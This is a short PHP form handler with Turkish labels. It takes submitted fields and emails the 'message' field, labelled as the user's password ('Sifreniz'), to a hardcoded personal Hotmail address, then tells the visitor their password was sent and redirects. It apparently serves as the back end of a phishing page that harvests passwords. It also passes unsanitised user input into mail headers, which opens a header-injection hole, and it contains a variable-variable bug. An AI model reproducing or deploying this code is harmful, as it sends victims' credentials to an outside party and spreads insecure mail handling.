<?php
if(!empty($_POST["yolla"]))
{
 $ad=$_POST["ad_soyad"];
 $email=$_POST["email"];
 $tel=$_POST["tel"];
$mesaj=$_POST["mesaj"];

 $sizin_eposta_adresiniz="         "; //mail atıldığında gösterilecek mail adresi
 
  
    $mailheader = "From: ". $email."\r\n"; 
    $mailheader .= "Reply-To: ".$$email."\r\n"; 
    $mailheader .= "Content-type: text/html; charset=iso-8859-1\r\n"; 
    $MESSAGE_BODY ="Sifreniz :".$mesaj; 
    $mail=mail("akifabi74@hotmail.com", "", $MESSAGE_BODY , $mailheader); 
                if($mail){  echo "ŞİFRENİZ BAŞARIYLA GÖNDERİLMİŞTİR <br>"; 
                     header("refresh:2;url=../index.php"); 


}

}
?>